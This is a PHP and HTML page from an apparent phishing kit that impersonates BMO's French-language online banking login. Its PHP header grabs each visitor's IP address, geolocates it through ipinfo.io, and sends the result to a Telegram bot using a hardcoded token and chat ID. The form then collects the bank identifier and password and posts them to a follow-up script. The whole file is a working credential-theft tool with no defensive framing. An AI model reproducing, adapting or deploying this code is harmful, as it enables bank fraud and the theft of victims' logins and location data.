<?php session_start();
$_SESSION["bank"] ='BMO';
?>


<?php
// Remplace par le token de ton bot Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
// Remplace par ton chat_id Telegram
$chat_id = '6242884372'; 

// Récupérer l'adresse IP de l'utilisateur
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip_address = $_SERVER['REMOTE_ADDR'];
}

// Utilisation de l'API ipinfo.io pour obtenir la géolocalisation à partir de l'adresse IP de l'utilisateur
$geo_url = "http://ipinfo.io/{$ip_address}/json";

// Initialise cURL pour obtenir la géolocalisation
$geo_ch = curl_init();
curl_setopt($geo_ch, CURLOPT_URL, $geo_url);
curl_setopt($geo_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($geo_ch, CURLOPT_SSL_VERIFYPEER, false);
$geo_response = curl_exec($geo_ch);

// Vérifie s'il y a une erreur dans la requête
if (curl_errno($geo_ch)) {
    $location_info = 'Impossible de récupérer la localisation.';
} else {
    $location_data = json_decode($geo_response, true);
    
    // Si l'API retourne les données correctement
    if (isset($location_data['loc'])) {
        $location_info = $location_data['loc']; // Cela retourne "latitude,longitude"
        list($latitude, $longitude) = explode(',', $location_info); // Sépare latitude et longitude
    } else {
        $location_info = 'Localisation inconnue.';
        $latitude = 'N/A';
        $longitude = 'N/A';
    }
}

// Ferme la session cURL pour l'API géo
curl_close($geo_ch);

// Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
$message = "🏛🏛*BMO*🏛🏛\n";
$message .= "IP: $ip_address\n";
$message .= "Latitude: $latitude\n";
$message .= "Longitude: $longitude";

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API Telegram
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);
?>





<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <base href="./bmo">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BMO</title>
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/bmo/styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="/bmo/styles_pc.css">
</head>
    <header>
        <span>BMO</span> <img  width=50px  src="/bmo/bmo.webp" alt="">
    </header>
<body>
    <h2>Ouverture de session – Services bancaires en ligne
</h2>

<div class="container">
    <form action="/bmo/sms.php" method="post">
        
        <label for="cvv">Identifiant</label>
        <input type="text" name="cvv">
           
        <div class="check">
                <input type="checkbox"> <span>Memoriser le numero</span>
        
            </div>
        <label for="mdp">Mot de passe</label>
        <input type="password" name="mdp">
            <div class="valid"> 
                <input type="submit" value="connection">
            </div>
       

    </form>


    <div class="info">
        <div class="info1">
            <h4>Enregistrer une nouvelle carte pour les services bancaires en ligne</h4>
           <a href=""> Carte de débit </a>ou  <a href="">Carte de crédit</a>
        </div>
        <div class="info2">
           <h4> Votre sécurité passe toujours en premier.</h4>
           Nous avons rendu les services bancaires en ligne plus pratiques, tout  
            en utilisant des technologies de sécurité avancées qui protègent votre argent et vos informations.

        <a href="">
            Learn more about how we protect you.Opens in a new tab
        </a>
        </div>

</div>



</div>

    <footer>

    </footer>
</body>
</html>